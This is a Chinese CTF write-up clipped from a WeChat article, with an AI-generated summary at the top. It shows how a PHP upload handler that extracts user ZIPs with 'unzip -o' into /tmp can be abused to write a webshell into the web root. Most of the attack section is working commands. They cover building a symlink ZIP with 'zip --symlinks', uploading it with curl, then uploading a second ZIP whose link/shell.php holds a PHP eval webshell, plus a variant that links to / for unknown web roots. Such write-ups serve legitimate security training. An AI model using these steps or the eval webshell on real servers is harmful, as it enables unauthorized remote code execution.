---
title: 【微信】CTF：ZIP 软链接解压写入 WebShell
source: https://mp.weixin.qq.com/s/N8-MR0kD3EnevUl9kjSXOw
source_host: mp.weixin.qq.com
clip_date: 2026-10-20T11:22:47+08:00
trace_id: cfe23116-0f51-45f8-b505-e6c827c17983
content_hash: 6e9ad7bcdd37818e29e2e028c59dee109ddda1696a14ddccee6027b7cc85b44b
status: synced
tags:
  - 微信
  - CTF
  - 漏洞分析
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: CTF 中，代码把用户上传的 ZIP 无条件 `unzip -o` 到 `/tmp` 时，可以通过两次上传（先在 `/tmp` 建立指向 Web 根目录的软链接，再让解压操作顺着该软链接把 shell.php 写入 Web 目录），最终实现 WebShell 写入。
ai_summary_style: key-points
images_status:
  total: 6
  succeeded: 6
  failed_urls: []
notion_page_id: 3ff75244-d011-8130-aec3-e3c39c516fb2
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> CTF 中，代码把用户上传的 ZIP 无条件 `unzip -o` 到 `/tmp` 时，可以通过两次上传（先在 `/tmp` 建立指向 Web 根目录的软链接，再让解压操作顺着该软链接把 shell.php 写入 Web 目录），最终实现 WebShell 写入。
> 
> - **漏洞点：** 仅校验 MIME 是否为 `application/zip`，随后执行 `cd /tmp && unzip -o 临时文件`；既没有过滤压缩包内容，也没有限制解压路径，并且 `-o` 会覆盖已有文件。
> - **第一次上传：** 用 `ln -s /var/www/html link` 加上 `zip --symlinks link.zip link` 打包软链接本身，上传解压后得到 `/tmp/link`，它指向 Web 根目录。
> - **第二次上传：** 在本地创建同名目录 `link/`，放入 `link/shell.php` 后打包上传；unzip 解析 `/tmp/link/shell.php` 时沿软链接落盘到 `/var/www/html/shell.php`。
> - **关键约束：** 必须先把软链接包传上去，再传 WebShell 包，且第二个包内顶层目录名与软链接名完全一致；Web 进程还需对目标目录有写权限。
> - **未知根目录时：** 改为让 `link` 指向 `/`，在包内构造 `link/var/www/html/shell.php`；常见根目录还有 `/var/www`、`/app`、`/usr/share/nginx/html`。

**小话安全** *2026年10月20日 10:56*

> 核心一句话：利用两次 ZIP 上传，第一次在 `/tmp` 创建指向 Web 根目录的软链接，第二次让 `unzip` 沿着软链接把 WebShell 解压到 Web 目录。

## 1\. 代码审计

关键代码：

```bash
if (finfo_file($finfo, $_FILES[”file”][”tmp_name”]) === 'application/zip')
{      
    exec('cd /tmp && unzip -o ' . $_FILES[”file”][”tmp_name”]);     
};  
```

可得出：

1.  上传字段名是 file；
    
2.  只检查上传文件 MIME 是否为 application/zip，普通 ZIP 即可通过；
    
3.  通过后执行：
    

```
cd /tmp && unzip -o 上传临时文件 
```

也就是把 ZIP 解压到 /tmp；4. -o 表示覆盖已有文件；5. 没有过滤压缩包内容，也没有限制解压路径。

直接上传包含 shell.php 的 ZIP，只会解压到 /tmp/shell.php，通常无法通过 Web 访问。因此需要利用ZIP 中的软链接，把解压路径“重定向”到 Web 根目录。

* * *

## 2\. 利用链

利用链如下：

```bash
第一次上传：ZIP 中包含软链接 link -> /var/www/html  
        ↓     
解压到 /tmp 后得到：/tmp/link -> /var/www/html      
        ↓      
第二次上传：ZIP 中包含 link/shell.php     
        ↓     
unzip 解压时访问 /tmp/link/shell.php      
        ↓      
实际写入 /var/www/html/shell.php      
        ↓      
访问 http://目标/shell.php
```

关键点：第二个压缩包里的目录名必须和第一次创建的软链接名一致。

* * *

## 3\. 具体步骤

### 第一步：构造指向 Web 根目录的软链接 ZIP

假设 Web 根目录是 /var/www/html：

```bash
ln -s /var/www/html link     
zip --symlinks link.zip link 
```

\--symlinks 很关键，表示把软链接本身打包进去，而不是打包链接目标目录的内容。

上传：

```
curl -F ”file=@link.zip” http://目标地址/ 
```

上传并解压后，服务器上会存在：

```
/tmp/link -> /var/www/html  
```

* * *

### 第二步：构造包含 WebShell 的 ZIP

创建与软链接同名的目录：

```bash
mkdir link     
echo '<?php eval($_POST[1]);?>' > link/shell.php     
zip -r shell.zip link/shell.php 
```

压缩包内部路径应为：

```bash
link/shell.php
```

上传：

```
curl -F ”file=@shell.zip” http://目标地址/ 
```

解压时，unzip 会解析：

```
/tmp/link/shell.php 
```

由于 /tmp/link 是指向 /var/www/html 的软链接，实际写入：

```
/var/www/html/shell.php 
```

* * *

### 第三步：访问 WebShell

访问：

```javascript
http://目标地址/shell.php
```

POST 参数：

```ini
;
```

即可验证。

* * *

## 4\. 如果不知道 Web 根目录

可以创建指向根目录 / 的软链接：

```bash
ln -s / link
zip --symlinks link.zip link 
```

然后第二个压缩包内部构造：

```bash
mkdir -p link/var/www/html     
echo '<?php eval($_POST[1]);?>' > link/var/www/html/shell.php     
zip -r shell.zip link/var/www/html/shell.php 
```

解压后：

```
/tmp/link/var/www/html/shell.php 
```

由于 /tmp/link -> /，实际写入：

```
/var/www/html/shell.php 
```

常见 Web 根目录还可以尝试：

```bash
/var/www/html      
/var/www     
/app      
/usr/share/nginx/html 
```

* * *

## 5\. 注意事项

1.  必须先上传软链接 ZIP，再上传 WebShell ZIP，顺序不能反；
    
2.  第二个 ZIP 内的目录名必须与软链接名完全一致，例如都叫link；
    
3.  打包软链接必须使用 zip --symlinks；
    
4.  Web 进程需要对目标 Web 目录有写权限；
    
5.  error_reporting(0)会隐藏错误，失败时需检查路径、权限、软链接是否创建成功；
    
6.  unzip -o 会覆盖已有文件，便于覆盖写入；
    
7.  仅用于授权 CTF/靶场环境，不要用于未授权系统。
    

* * *

## 6\. 解题流程总结

```bash
代码审计发现 ZIP 自动解压到 /tmp    
        ↓      
直接上传 shell 只能进 /tmp，无法访问     
        ↓     
利用 ZIP 软链接：link -> Web 根目录      
        ↓     
第一次上传创建 /tmp/link 软链接    
        ↓     
第二次上传 link/shell.php      
        ↓    
unzip 沿软链接写入 Web 根目录    
        ↓    
访问 /shell.php 获取 WebShell
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/bfdb052a0ce57281.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/71b0c1593bafb7db.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/c74560d4569b8adf.png)

依次上传link.zip link1.zip

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/94a9de3cd2ecf9cb.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/0dde08e9cefa4c82.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/c2ea492088b5bd5b.png)

CTF学习 · 目录
